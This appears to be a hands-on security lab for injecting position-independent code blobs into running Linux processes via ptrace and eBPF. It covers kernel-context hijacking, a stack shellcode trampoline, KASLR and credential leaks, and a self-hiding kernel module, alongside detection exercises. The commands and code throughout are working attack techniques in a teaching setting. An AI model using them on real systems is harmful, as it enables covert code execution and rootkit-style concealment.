# Lab: eBPF PIC Blob Loader

## Objective

Learn how eBPF can be used as a trigger/observation mechanism combined with
ptrace-based process injection to load position-independent code blobs into
a running process — without touching disk.

## Background

### Why eBPF + PIC blobs?

| Component | Role |
|-----------|------|
| **PIC blob** | Self-contained executable code with no relocations, no libc, no loader needed. Entry at offset 0. |
| **eBPF program** | Kernel-side trigger/sensor — detects when a target process does something interesting (calls a function, execs a binary). |
| **Userspace loader** | Receives eBPF event, uses ptrace + `/proc/<pid>/mem` to inject the blob into the target's address space. |

The key insight: eBPF gives you **kernel-level visibility** (what processes are
running, what syscalls they make) while the PIC blob format gives you
**position-independent payloads** that work at any load address without fixups.

### PIC blob memory layout

```
Offset 0x0000  ┌──────────────┐  ← __blob_start / entry point
                │   .text      │     Code (position-independent)
                ├──────────────┤
                │   .rodata    │     Read-only data (strings, etc.)
                ├──────────────┤
                │   .got       │     Global Offset Table (MIPS only)
                ├──────────────┤
                │   .data      │     Initialized data
                ├──────────────┤
                │   .bss       │     Zero-initialized data
                ├──────────────┤  ← __blob_end / __config_start
                │   .config    │     Runtime config struct (injected)
                └──────────────┘
```

## Prerequisites

```bash
# On Ubuntu/Debian lab machines:
sudo apt install -y bpfcc-tools python3-bpfcc qemu-user-static

# Set up the project
cd /path/to/pic
source sourceme
pip install -e ".[dev]"
```

## Exercises

### Exercise 1: Examine a PIC blob

```bash
# Build the hello blob for x86_64
bazel build --config=linux_x86_64 //modules/picblobs/src/payload:hello

# Stage it
python tools/stage_blobs.py --targets hello --configs linux:x86_64

# Inspect metadata
python -m picblobs info hello linux:x86_64

# Disassemble it
python -m picblobs listing hello linux:x86_64
```

**Questions:**
1. What is the total code size? Why is it so small?
2. Where is the entry point? What's at offset 0?
3. What syscalls does the hello blob make? (Hint: look at the disassembly)

### Exercise 2: Direct injection (no eBPF)

This exercise uses only ptrace + `/proc/<pid>/mem`. No eBPF yet — understand
the injection mechanics first.

**Terminal 1** — start a target process:
```bash
# A simple process that sleeps forever (our injection target)
sleep 9999 &
TARGET_PID=$!
echo "Target PID: $TARGET_PID"
```

**Terminal 2** — inject:
```bash
sudo python3 mbed/ebpf_loader.py inject --pid $TARGET_PID
```

**What happens step by step:**

1. `ptrace(ATTACH)` — pauses the target, gives us control
2. `GETREGS` — save the current register state (RIP, RSP, etc.)
3. Write `syscall; int3` at current RIP — a 3-byte trampoline
4. Set registers for `mmap(addr, size, RWX, MAP_PRIVATE|MAP_ANON, -1, 0)`
5. `CONT` — target executes the mmap, traps on int3
6. Read RAX — the mmap return value (our new RWX region)
7. Restore original bytes at RIP
8. Write blob bytes to `/proc/<pid>/mem` at the mmap'd address
9. Set RIP to the blob entry point
10. `ptrace(DETACH)` — target resumes, now executing the blob

**Questions:**
1. Why do we need to make the target call mmap itself? (Why can't we just
   write to arbitrary memory?)
2. Why is RWX (read-write-execute) required?
3. What would you need to change for an aarch64 target?

### Exercise 3: eBPF uprobe trigger

Now add eBPF as a trigger mechanism. The blob is injected when the target
process calls a specific function.

**Terminal 1** — start a target that periodically writes:
```bash
# Python process that writes to stdout every 2 seconds
python3 -c "
import time
while True:
    print('tick', flush=True)
    time.sleep(2)
" &
TARGET_PID=$!
echo "Target PID: $TARGET_PID"
```

**Terminal 2** — attach uprobe loader:
```bash
sudo python3 mbed/ebpf_loader.py uprobe \
    --pid $TARGET_PID \
    --symbol write
```

**What the eBPF program does:**

```c
// Attached as uprobe to libc:write in the target process
int on_uprobe_hit(struct pt_regs *ctx) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    if (pid != TARGET_PID) return 0;     // filter

    // Send event to userspace via ring buffer
    struct event_t *e = events.ringbuf_reserve(...);
    e->pid = pid;
    e->addr = PT_REGS_IP(ctx);           // where the probe fired
    events.ringbuf_submit(e, 0);
}
```

When the target calls `write()`, the eBPF program fires in kernel context,
sends the PID to userspace via ring buffer, and userspace performs the
injection.

**Questions:**
1. Why use a ring buffer instead of a perf buffer?
2. What other functions could you probe to trigger injection?
3. How would you modify this to inject into *any* process that calls a
   specific function (not just a known PID)?

### Exercise 4: Exec watch

The most operationally useful mode — automatically inject into a process
the moment it starts.

**Terminal 1** — set up the watcher:
```bash
sudo python3 mbed/ebpf_loader.py watch \
    --exec-path /usr/bin/id
```

**Terminal 2** — trigger it:
```bash
id
```

The eBPF program hooks the `sched:sched_process_exec` tracepoint, which
fires every time any process calls `execve()`. It filters by the target's
`comm` (process name) and signals userspace when a match is found.

### Exercise 5: Cross-architecture blobs

PIC blobs are cross-compiled. On an x86_64 host, you can run aarch64 blobs
under QEMU:

```bash
# Build and stage aarch64 blob
bazel build --config=linux_aarch64 //modules/picblobs/src/payload:hello
python tools/stage_blobs.py --targets hello --configs linux:aarch64

# Run it natively via QEMU (no injection, just verify it works)
python -m picblobs run hello linux:aarch64

# For injection into an aarch64 process, you'd need:
# 1. An aarch64 target process (running under qemu-aarch64-static)
# 2. Modified register struct in the loader (UserRegs → aarch64 layout)
# 3. Modified syscall injection (svc #0 instead of syscall)
```

---

## Part 2: Kernel-Context Injection (ebpf_kernel_loader.py)

These exercises use `bpf_probe_write_user()` to write blob bytes **directly
from kernel context** — no ptrace, no `/proc/<pid>/mem`, no userspace
involvement in the write.

### How bpf_probe_write_user works

```
 ┌────────────────────────────────────────────────────────┐
 │  KERNEL SPACE                                         │
 │                                                       │
 │  eBPF program (attached to uprobe/tracepoint)         │
 │    │                                                  │
 │    ├─ bpf_probe_write_user(dst, src, len)             │
 │    │    Writes directly to the CURRENT task's          │
 │    │    userspace page tables. Kernel does the         │
 │    │    copy_to_user() equivalent from BPF context.    │
 │    │                                                  │
 │    └─ Runs during probe handler execution —            │
 │       target is on-cpu, not stopped, not ptraced.     │
 ├───────────────────────────────────────────────────────┤
 │  USER SPACE                                           │
 │                                                       │
 │  Target process: calls write() → uprobe fires →       │
 │    blob bytes appear in its address space →            │
 │    return address overwritten → blob executes          │
 │                                                       │
 │  Target never knows. No SIGSTOP. No TracerPid.        │
 └────────────────────────────────────────────────────────┘
```

### Exercise 6: Kernel-context write (kwrite)

The simplest kernel-context technique. The blob is stored in a BPF array
map, and each time the target calls the probed function, one 256-byte
chunk is written into a pre-mapped RWX region.

**Prerequisite**: The target needs an RWX region. For the lab, compile a
cooperative target:

```c
// target_rwx.c — compile with: gcc -o target_rwx target_rwx.c
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {
    // Map RWX region at the expected address
    void *p = mmap((void *)0x7F00000000ULL, 0x10000,
                   PROT_READ|PROT_WRITE|PROT_EXEC,
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    printf("RWX region: %p\n", p);

    // Loop calling write() — each call lets eBPF write one chunk
    while (1) {
        write(1, ".", 1);
        usleep(500000);
    }
}
```

**Terminal 1**:
```bash
gcc -o /tmp/target_rwx target_rwx.c
/tmp/target_rwx &
TARGET_PID=$!
```

**Terminal 2**:
```bash
sudo python3 mbed/ebpf_kernel_loader.py kwrite --pid $TARGET_PID
```

**Watch the output** — each dot the target prints triggers a chunk write:
```
    [kernel] Chunk 1/3 written → 0x0000007f00000000
    [kernel] Chunk 2/3 written → 0x0000007f00000100
    [kernel] Chunk 3/3 written → 0x0000007f00000200

[+] [kernel] All chunks written. Return address overwritten.
[+] [kernel] Target will jump to 0x0000007f00000000 on function return.
```

**Key insight**: The writes happen inside the kernel's probe handler.
There is zero userspace involvement after the BPF program is loaded.
The userspace Python script is only watching the ring buffer for status.

**Questions:**
1. Why is the blob split into 256-byte chunks?
   (Hint: BPF stack limit and verifier constraints)
2. What would happen if the RWX region isn't mapped? Would the kernel crash?
   (Hint: bpf_probe_write_user returns an error code)
3. Compare `/proc/<pid>/status` during kwrite vs ptrace injection.
   What's different about `TracerPid`?

### Exercise 7: Syscall hijack (fully autonomous)

The most advanced technique. The eBPF program:
1. Hooks `sys_enter` — detects when the target calls `mmap()`
2. Hooks `sys_exit` — captures the mmap return value (the new address)
3. Uses a uprobe — writes blob chunks into the captured address
4. Overwrites the return address to redirect execution

No cooperation from the target. No pre-arranged RWX region. The eBPF
program piggybacks on the target's own memory allocations.

**Terminal 1** — start a target that occasionally allocates memory:
```bash
python3 -c "
import mmap, time
while True:
    # Python's print() internally calls mmap for buffer management
    print('allocating...', flush=True)
    time.sleep(1)
" &
TARGET_PID=$!
```

**Terminal 2**:
```bash
sudo python3 mbed/ebpf_kernel_loader.py hijack --pid $TARGET_PID
```

**Expected output**:
```
[*] [kernel] Phase 1: Detected mmap syscall from PID 5678
[+] [kernel] Phase 2: Captured mmap return: 0x00007f8a12340000
    [kernel] Phase 3: Chunk 1/3 → 0x00007f8a12340000
    [kernel] Phase 3: Chunk 2/3 → 0x00007f8a12340100
    [kernel] Phase 3: Chunk 3/3 → 0x00007f8a12340200

[+] [kernel] Phase 4: Return address overwritten → 0x00007f8a12340000
[+] Fully autonomous injection complete. Zero userspace involvement.
```

**Questions:**
1. The hijack technique writes into whatever mmap returns — this region
   may not be executable. Why might this still work?
   (Hint: the kernel checks W^X at mprotect time, not at execution time
   on some configurations)
2. What happens if the target never calls mmap? How could you force it?
3. How could you modify this to also call `mprotect()` on the region
   to add PROT_EXEC?

### Exercise 8: Stack trampoline

Write a tiny mmap+read+jmp stub directly onto the target's stack from
kernel context. Only works with executable stacks (`-z execstack`).

```bash
# Compile target with executable stack
gcc -z execstack -o /tmp/target_execstack -x c - <<'EOF'
#include <stdio.h>
#include <unistd.h>
int main() {
    while (1) {
        write(1, "waiting\n", 8);
        sleep(1);
    }
}
EOF

/tmp/target_execstack &
TARGET_PID=$!

# Inject stack trampoline
sudo python3 mbed/ebpf_kernel_loader.py smash --pid $TARGET_PID
```

The 62-byte x86_64 trampoline written to the stack:
```nasm
; mmap(NULL, 0x10000, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
xor    rdi, rdi
mov    rsi, 0x10000
mov    rdx, 7              ; PROT_READ|WRITE|EXEC
mov    r10, 0x22           ; MAP_PRIVATE|MAP_ANONYMOUS
or     r8, -1              ; fd = -1
xor    r9, r9
mov    rax, 9              ; __NR_mmap
syscall

; read(0, mmap_addr, 0x10000)  — reads blob from stdin
mov    rdi, rax
mov    rbx, rax            ; save for jump
mov    rsi, rdi
xor    rdi, rdi            ; fd = 0
mov    rdx, 0x10000
xor    rax, rax            ; __NR_read
syscall

; jump to blob
jmp    rbx
```

**Questions:**
1. Why is the trampoline only 62 bytes? Why not embed the full blob?
2. Modern binaries never use `-z execstack`. What other ways could you
   get executable memory without mmap? (Hint: JIT engines, ROP)
3. `bpf_probe_write_user` emits a kernel warning in dmesg. Find it.
   What does this tell you about detection?

---

## Architecture Deep Dive

### Comparison: userspace vs kernel-context injection

| Aspect | ebpf_loader.py (userspace) | ebpf_kernel_loader.py (kernel) |
|--------|---------------------------|-------------------------------|
| **Injection mechanism** | ptrace + /proc/pid/mem | bpf_probe_write_user |
| **Target state during write** | STOPPED (SIGSTOP) | RUNNING (on-cpu in probe) |
| **TracerPid visible** | Yes | No |
| **Requires ptrace permission** | Yes | No (needs CAP_BPF) |
| **Max payload size** | Unlimited | ~64 KB (BPF map limits) |
| **Write granularity** | Single write | 256-byte chunks over N probes |
| **Detection surface** | ptrace, /proc/mem access | BPF prog load, dmesg warning |
| **Kernel version** | Any (ptrace is ancient) | 5.8+ (ring buffer, write helper) |

### Injection flow: kernel-context (kwrite)

```
 ┌──────────────────────────────────────────────────────────────┐
 │  KERNEL                                                      │
 │                                                              │
 │  uprobe fires ──► BPF program runs ──► bpf_probe_write_user │
 │       │                                       │              │
 │       │           blob_map[chunk_idx]          │              │
 │       │           ┌──────────┐                 │              │
 │       │           │ chunk 0  │─────────────────┼──► target   │
 │       │           │ chunk 1  │                 │    memory    │
 │       │           │ chunk 2  │                 │              │
 │       │           └──────────┘                 │              │
 │       │                                        │              │
 │       └── ring buffer event ──► userspace      │              │
 │           (status only, no injection role)      │              │
 └──────────────────────────────────────────────────────────────┘
```

### Injection flow: syscall hijack

```
 ┌──────────────────────────────────────────────────────────────┐
 │  KERNEL                                                      │
 │                                                              │
 │  sys_enter(mmap) ──► detect target's mmap call               │
 │       │                                                      │
 │  sys_exit(mmap) ──► capture returned address ──► state_map   │
 │       │                                                      │
 │  uprobe(write) ──► read addr from state_map                  │
 │       │             read chunk from blob_map                 │
 │       │             bpf_probe_write_user(addr, chunk, 256)   │
 │       │             repeat until all chunks written           │
 │       │             overwrite [RSP] with blob entry           │
 │       │                                                      │
 │  function return ──► target jumps to blob                    │
 └──────────────────────────────────────────────────────────────┘
```

### Key eBPF helpers used

| Helper | Purpose |
|--------|---------|
| `bpf_get_current_pid_tgid()` | Get PID/TID of the process that triggered the probe |
| `bpf_get_current_comm()` | Get process name (for exec filtering) |
| `bpf_probe_write_user()` | **Write to current task's userspace memory from kernel** |
| `PT_REGS_IP(ctx)` | Read instruction pointer at probe site |
| `PT_REGS_SP(ctx)` | Read stack pointer (for return address overwrite) |
| `ringbuf_reserve/submit` | Zero-copy event delivery to userspace |

### Detection considerations (blue team perspective)

| Indicator | Detection method |
|-----------|-----------------|
| ptrace attach (userspace only) | `/proc/<pid>/status` shows `TracerPid != 0` |
| RWX mmap | `/proc/<pid>/maps` shows `rwxp` regions |
| `/proc/<pid>/mem` write (userspace only) | audit syscall logging |
| eBPF program load | `bpftool prog list` shows loaded programs |
| uprobe attachment | `/sys/kernel/debug/tracing/uprobe_events` |
| **bpf_probe_write_user** | **`dmesg` shows kernel warning** |
| BPF maps with blob data | `bpftool map dump` reveals payload |
| raw_tracepoint hooks | `bpftool prog list` shows raw_tp programs |

---

## Part 3: Kernel Memory Exploration (ebpf_kernel_mem.py)

These exercises read kernel data structures directly from eBPF using
`bpf_probe_read_kernel()` — the kernel-memory counterpart of
`bpf_probe_write_user()`.

### Exercise 9: Credential dump

Read any process's UID, GID, and full capability set directly from the
kernel's `task_struct → real_cred` chain.

```bash
# Dump creds for a specific PID
sudo python3 mbed/ebpf_kernel_mem.py creds --pid $$

# Dump all processes that call write()
sudo python3 mbed/ebpf_kernel_mem.py creds --limit 50
```

**What the BPF program reads:**
```
task_struct (bpf_get_current_task())
  └─► real_cred (struct cred *)
        ├─► uid, euid, suid, fsuid
        ├─► gid, egid, sgid, fsgid
        ├─► cap_effective   (what the process CAN do right now)
        ├─► cap_permitted   (what it's allowed to enable)
        ├─► cap_inheritable (passed across execve)
        ├─► cap_bounding    (upper limit)
        └─► cap_ambient     (auto-inherited)
```

**Questions:**
1. What's the difference between `uid` and `euid`? When do they differ?
2. A process with `CAP_SYS_PTRACE` can ptrace any process. Find all
   processes with this capability. Are any surprising?
3. What would a privilege escalation look like in this data?
   (Hint: `commit_creds(prepare_kernel_cred(0))`)

### Exercise 10: Task list walk + hidden process detection

Walk the kernel's linked list of `task_struct`s — the ground truth of
what's running. Compare against `/proc` to find hidden processes.

```bash
sudo python3 mbed/ebpf_kernel_mem.py tasks --check-hidden
```

**How it works:**
```
init_task (from /proc/kallsyms)
  └─► tasks.next ──► task_struct (PID 1)
                       └─► tasks.next ──► task_struct (PID 2)
                                           └─► tasks.next ──► ...
                                                               └─► back to init_task
```

The BPF program walks this circular linked list using
`bpf_probe_read_kernel()` at each step. It reads PID, comm, UID,
parent PID, and the `mm` pointer (NULL = kernel thread).

**Rootkit detection:** A userspace rootkit can hide from `ps` by
manipulating `/proc`, but it cannot hide from a BPF program walking
the kernel task list — that's the source of truth.

**Questions:**
1. Why do kernel threads have `mm_addr = 0`?
2. What `task->flags` values indicate a kernel thread? (Hint: `PF_KTHREAD`)
3. How does a rootkit hide a process from `/proc` but not from the task list?

### Exercise 11: Kernel module enumeration

Walk the kernel's module list. Find loaded kernel modules including
ones hidden from `/proc/modules` by rootkits that unlink themselves.

```bash
sudo python3 mbed/ebpf_kernel_mem.py modules --check-hidden
```

**What it reads:**
```
modules (global list_head, from /proc/kallsyms)
  └─► struct module (list.next)
        ├─► name[56]
        ├─► state (LIVE / COMING / GOING)
        ├─► core_layout.base  ← where .text lives in kernel memory
        ├─► core_layout.size
        └─► list.next ──► next module ──► ... ──► back to head
```

**Questions:**
1. A rootkit module can remove itself from this list to hide.
   What other data structures could you check?
   (Hint: sysfs, kobj, the module's own .text pages in kernel memory)
2. What does the `core_layout.base` address tell you about where
   kernel modules live in virtual memory?
3. Why is `init_layout.size` zero for most modules after loading?

### Exercise 12: VMA walk (process memory map from kernel)

Read the kernel's `vm_area_struct` list for any process — the ground
truth behind `/proc/<pid>/maps`. Finds RWX regions that are injection
targets.

```bash
# Start a target
sleep 9999 &
sudo python3 mbed/ebpf_kernel_mem.py vmas --pid $!
```

**Kernel data structures traversed:**
```
task_struct
  └─► mm (struct mm_struct *)
        └─► mmap (struct vm_area_struct *)  ← head of VMA list
              ├─► vm_start, vm_end          ← address range
              ├─► vm_flags                  ← VM_READ|VM_WRITE|VM_EXEC
              ├─► vm_file → f_path.dentry → d_name  ← backing file
              └─► vm_next ──► next VMA ──► ...
```

The output looks like `/proc/pid/maps` but is read from kernel memory,
not the procfs interface. This means it cannot be fooled by procfs hooks.

**Questions:**
1. Find the `[heap]`, `[stack]`, and `[vdso]` regions. What permissions
   does each have?
2. Are there any RWX regions? What are they?
3. How would you detect injected code by comparing VMA walk output
   against the expected memory layout of the binary?

### Exercise 13: KASLR leak

Extract the kernel's ASLR slide from eBPF probe context, demonstrating
that KASLR provides no protection against an attacker with BPF access.

```bash
sudo python3 mbed/ebpf_kernel_mem.py kaslr
```

**How it works:**
- BPF attaches a kprobe to `__x64_sys_getpid`
- Inside the probe, `PT_REGS_IP(ctx)` gives the instruction pointer
- This is a kernel-space address that reveals the KASLR offset
- `bpf_get_current_task()` also returns a kernel address

**Questions:**
1. Without KASLR, `_stext` is at `0xffffffff81000000`. With KASLR,
   it's shifted by up to 1GB. What's the slide on your machine?
2. Once you know one kernel address, how do you resolve all others?
3. Why doesn't KASLR protect against BPF-based attacks?

### Exercise 14: Kernel symbol resolution

Resolve kernel function addresses by attaching kprobes — effectively
a BPF-based `/proc/kallsyms` reader.

```bash
sudo python3 mbed/ebpf_kernel_mem.py kallsyms \
    --symbol commit_creds \
    --symbol prepare_kernel_cred \
    --symbol core_pattern \
    --symbol __x64_sys_execve
```

**Why these symbols matter:**
| Symbol | Significance |
|--------|-------------|
| `commit_creds` | Sets credentials on current task — privesc target |
| `prepare_kernel_cred` | Allocates root cred struct (uid=0, all caps) |
| `core_pattern` | Overwrite → arbitrary command exec on crash |
| `__x64_sys_execve` | Hook → intercept all program execution |

---

## Part 4: Custom Kernel Programs (ebpf_kernel_prog.py)

Students can load their own eBPF programs into kernel space to
experiment with kernel internals. See `mbed/ebpf_kernel_prog.py` for
a framework that lets you write custom kernel-context programs.

### Exercise 15: Syscall monitor from kernel context

Trace every syscall a process makes, with arguments and return values,
from inside the kernel:

```bash
# Start a target
python3 -c "import os; os.listdir('/tmp')" &

# Monitor its syscalls
sudo python3 mbed/ebpf_kernel_prog.py syscall-monitor --pid $!
```

**Output shows entry (→) and exit (←) for every syscall:**
```
    0.000123     1234  python3          → openat          (0xffffff9c, 0x7f..., 0x80000)
    0.000156     1234  python3          ← openat          ret=3
    0.000201     1234  python3          → getdents64      (0x3, 0x7f..., 0x8000)
    0.000234     1234  python3          ← getdents64      ret=456
```

**Questions:**
1. Compare this output with `strace`. What's different about where
   the data comes from? (Hint: strace uses ptrace, this uses tracepoints)
2. Can the target process detect that it's being monitored this way?

### Exercise 16: Credential change monitor (privesc detection)

Hook `commit_creds` — the single kernel function through which ALL
credential changes flow. Detects privilege escalation in real time:

```bash
# Terminal 1: start the monitor
sudo python3 mbed/ebpf_kernel_prog.py cred-monitor

# Terminal 2: trigger a credential change
sudo su - nobody -c "id"
```

**When a process goes from non-root to root, you'll see:**
```
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[!!!] PRIVILEGE ESCALATION DETECTED
[!!!] PID 5678 (su) went from euid=1000 → euid=0 (ROOT)
[!!!] Caller: 0xffffffff81234567
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

### Exercise 17: XDP network packet inspector

Attach an XDP program to the NIC — this runs before the kernel
network stack even sees the packet:

```bash
sudo python3 mbed/ebpf_kernel_prog.py net-inspect --iface eth0
```

**Where XDP sits in the packet path:**
```
NIC hardware → XDP program (HERE) → tc → netfilter → socket
```

### Exercise 18: File I/O snoop

Monitor all file operations from kernel context:

```bash
sudo python3 mbed/ebpf_kernel_prog.py file-snoop --pid 1234
```

### Exercise 19: Write your own kernel program

Create a custom BPF C program and load it into the kernel:

```bash
# Create your program
cat > /tmp/my_prog.c << 'EOF'
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

struct event_t {
    u32 pid;
    u64 addr;
    char comm[16];
};

BPF_RINGBUF_OUTPUT(events, 1 << 14);

// Your code runs in KERNEL CONTEXT (ring 0)
// You can read any kernel data structure
int my_probe(struct pt_regs *ctx) {
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();

    struct event_t *e = events.ringbuf_reserve(sizeof(*e));
    if (!e) return 0;

    e->pid = bpf_get_current_pid_tgid() >> 32;
    e->addr = (u64)task;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    events.ringbuf_submit(e, 0);
    return 0;
}
EOF

# Load it into the kernel
sudo python3 mbed/ebpf_kernel_prog.py custom --program /tmp/my_prog.c
```

**Available BPF helpers for your programs:**
```
bpf_probe_read_kernel(dst, len, src)   — read kernel memory
bpf_probe_write_user(dst, src, len)    — write to userspace memory
bpf_get_current_task()                 — get current task_struct *
bpf_get_current_pid_tgid()            — PID and TID
bpf_get_current_comm(buf, len)         — process name
bpf_ktime_get_ns()                     — nanosecond timestamp
bpf_get_current_uid_gid()             — UID and GID
bpf_probe_read_user(dst, len, src)     — read userspace memory
bpf_probe_read_kernel_str(dst, len, s) — read kernel string
```

**The BPF verifier will reject your program if:**
- Loops are unbounded (use `#pragma unroll` or bounded `for`)
- Memory access is out of bounds or unvalidated
- Stack usage exceeds 512 bytes
- You access kernel memory without `bpf_probe_read_kernel()`
- The program is too complex (>1M verified instructions)

**Questions:**
1. Why does the BPF verifier exist? What would happen without it?
2. What's the difference between `bpf_probe_read_kernel` and a
   direct pointer dereference in BPF? (Hint: fault handling)
3. Can a BPF program crash the kernel? Why or why not?

List all templates with: `python3 mbed/ebpf_kernel_prog.py list`

---

## Part 5: Kernel Module Blob Loader (kmod_loader/)

eBPF runs in ring 0 but is **sandboxed by the verifier**. Kernel modules
run in ring 0 with **no restrictions**. This section demonstrates the
difference.

### eBPF vs kernel module — what ring 0 really means

```
┌───────────────────────────────────────────────────────────────┐
│  Ring 0 (kernel)                                              │
│                                                               │
│  ┌─────────────────────────┐  ┌─────────────────────────────┐│
│  │  eBPF (sandboxed)       │  │  Kernel module (unrestricted)││
│  │                         │  │                             ││
│  │  ✓ Read kernel memory   │  │  ✓ Read kernel memory       ││
│  │  ✗ Write kernel memory  │  │  ✓ Write kernel memory      ││
│  │  ✗ Call any function    │  │  ✓ Call any function         ││
│  │  ✗ Alloc exec pages     │  │  ✓ Alloc exec pages         ││
│  │  ✗ Modify page tables   │  │  ✓ Modify page tables       ││
│  │  ✗ Hook syscall table   │  │  ✓ Hook syscall table       ││
│  │  ✗ Load other modules   │  │  ✓ Load other modules       ││
│  │  ✗ Unbounded loops      │  │  ✓ Unbounded loops          ││
│  │  ✓ Verifier-enforced    │  │  ✗ No safety checks         ││
│  │    safety               │  │    (crash = kernel panic)    ││
│  └─────────────────────────┘  └─────────────────────────────┘│
│                                                               │
│  Both run at CPL 0 (ring 0). The difference is SOFTWARE       │
│  enforcement (BPF verifier), not HARDWARE enforcement.        │
└───────────────────────────────────────────────────────────────┘
```

### Exercise 20: Build and load the kernel module

```bash
cd mbed/kmod_loader

# Build pic_kmod.ko
sudo python3 load_kmod.py build

# Load without a blob (just inspect kernel context)
sudo python3 load_kmod.py load

# Check dmesg — the module prints kernel addresses
sudo dmesg | grep pic_kmod
```

**Expected dmesg output:**
```
pic_kmod: ══════ PIC KERNEL BLOB LOADER ══════
pic_kmod: demonstrating unrestricted ring 0 code execution
pic_kmod: running in ring 0 (CPL=0)
pic_kmod: kernel text: ffffffff81000000
pic_kmod: this module: ffffffffc0a12000 (core: ffffffffc0a12000, size: 4096)
pic_kmod: current task_struct: ffff888123456780
pic_kmod: no blob_path specified — module loaded for inspection only
```

**Questions:**
1. Compare the `kernel text` address with the KASLR leak from Exercise 13.
   Do they match?
2. What is the `core` address? How does it relate to what
   `ebpf_kernel_mem.py modules` reports?
3. Why does the module print `CPL=0`? What does CPL mean?
   (Hint: Current Privilege Level — x86 rings)

### Exercise 21: Load a PIC blob into kernel memory

```bash
# Extract a blob to flat binary
python -m picblobs extract hello linux:x86_64 -o /tmp/hello.bin

# Load it into kernel executable pages (but don't execute)
sudo python3 mbed/kmod_loader/load_kmod.py load \
    --blob-type hello

# Check dmesg — see the blob in kernel memory
sudo dmesg | grep pic_kmod
```

**Expected output:**
```
pic_kmod: loading blob from: /tmp/kblob_xxxxx.bin
pic_kmod: read 142 bytes from /tmp/kblob_xxxxx.bin
pic_kmod: allocated 1 executable pages at ffffffffc0b34000
pic_kmod: blob loaded at ffffffffc0b34000 (142 bytes, 1 pages)
pic_kmod: first 16 bytes: 55 48 89 e5 48 83 ec 10 ...
pic_kmod: blob loaded but NOT executed (use exec_blob=1 to run)
```

**Key operations the module performs:**
1. `vmalloc()` — Allocate page-aligned kernel memory
2. `set_memory_x()` — Clear the NX bit (make pages executable)
3. `memcpy()` — Copy blob bytes into executable pages
4. The blob now lives in kernel memory at a known address

**IMPORTANT**: Do NOT use `--exec` with userspace blobs. They use the
`syscall` instruction, which expects userspace context. Executing a
userspace blob in ring 0 will kernel panic. Kernel blobs need to call
kernel functions directly via function pointers (see `pic_kblob.c`).

### Exercise 22: Module hiding (rootkit technique)

```bash
# Load module with hiding enabled
sudo python3 mbed/kmod_loader/load_kmod.py load --hide

# Verify it's hidden
lsmod | grep pic_kmod        # nothing!
cat /proc/modules | grep pic  # nothing!
ls /sys/module/ | grep pic    # nothing!

# But the module is still in kernel memory and running.
# Prove it with eBPF:
sudo python3 mbed/ebpf_kernel_mem.py modules --check-hidden
```

**Expected eBPF output:**
```
[!] Modules in kernel list but NOT in /proc/modules:
    pic_kmod @ ffffffffc0a12000 (size 4096)
[!] These modules may be hidden by a rootkit!
```

**How hiding works:**
```c
// The module removes itself from the kernel's module list:
list_del_init(&THIS_MODULE->list);

// This means:
//   /proc/modules  — reads the list → doesn't see it
//   lsmod          — reads /proc/modules → doesn't see it
//   rmmod          — searches by name in list → can't find it
//
// But the code and data remain allocated in kernel memory.
// The eBPF module walker finds it because it walks the SAME list
// at a point in time before the unlink, or finds residual evidence.
```

**Questions:**
1. After hiding, `rmmod pic_kmod` fails. How would you unload it?
   (Hint: you can't without the list entry — reboot required)
2. What ELSE could a rootkit hide besides itself?
   (Hint: processes, files, network connections, other modules)
3. The eBPF module walker uses the same `modules` list. If the rootkit
   unlinks BEFORE our walk, how else could we detect it?
   (Hint: scan kernel memory for module signatures, check memory allocator)

### Exercise 23: Userspace blob vs kernel blob

Understand WHY userspace PIC blobs can't run in ring 0:

```
Userspace blob (hello.c):          Kernel blob (pic_kblob.c):
  _start:                            _start:
    mov rax, 1     ; __NR_write         ; Get printk pointer from config
    mov rdi, 1     ; fd=stdout          mov rdi, [config + 0]
    lea rsi, [msg] ; buffer             lea rsi, [msg]
    mov rdx, 14    ; length             call rdi   ; call printk directly
    syscall        ; TRAP TO KERNEL     ret        ; return to caller
                   ; ↑ This TRAPS from
                   ; ring 3 to ring 0.
                   ; If we're ALREADY in
                   ; ring 0, the syscall
                   ; instruction still works
                   ; but the handler expects
                   ; userspace context
                   ; (pt_regs, user pages).
                   ; Result: corruption or
                   ; kernel panic.
```

The fundamental difference:
- **Userspace blobs** use `syscall` to request kernel services
- **Kernel blobs** call kernel functions directly (no trap needed)
- A kernel blob needs function pointers (like Windows PE resolution)
  because it can't link against kernel symbols at compile time

---

## Reference

### Userspace loader (ebpf_loader.py)
```
mbed/ebpf_loader.py uprobe --pid PID [--symbol SYM] [--library LIB] [blob opts]
mbed/ebpf_loader.py watch  --exec-path PATH                          [blob opts]
mbed/ebpf_loader.py inject --pid PID                                  [blob opts]
```

### Kernel-context loader (ebpf_kernel_loader.py)
```
mbed/ebpf_kernel_loader.py kwrite --pid PID [--symbol SYM] [--load-addr ADDR]  [blob opts]
mbed/ebpf_kernel_loader.py hijack --pid PID [--symbol SYM]                      [blob opts]
mbed/ebpf_kernel_loader.py smash  --pid PID [--symbol SYM]                      [blob opts]
```

### Kernel memory explorer (ebpf_kernel_mem.py)
```
mbed/ebpf_kernel_mem.py creds    --pid PID [--limit N]
mbed/ebpf_kernel_mem.py tasks    [--check-hidden]
mbed/ebpf_kernel_mem.py modules  [--check-hidden]
mbed/ebpf_kernel_mem.py vmas     --pid PID
mbed/ebpf_kernel_mem.py kaslr
mbed/ebpf_kernel_mem.py kallsyms [--symbol NAME ...]
```

### Custom kernel programs (ebpf_kernel_prog.py)
```
mbed/ebpf_kernel_prog.py syscall-monitor --pid PID
mbed/ebpf_kernel_prog.py file-snoop      --pid PID
mbed/ebpf_kernel_prog.py net-inspect     --iface IFACE
mbed/ebpf_kernel_prog.py keylog-detect
mbed/ebpf_kernel_prog.py cred-monitor
mbed/ebpf_kernel_prog.py custom          --program FILE [--pid PID]
mbed/ebpf_kernel_prog.py list
```

### Kernel module loader (kmod_loader/)
```
mbed/kmod_loader/load_kmod.py build
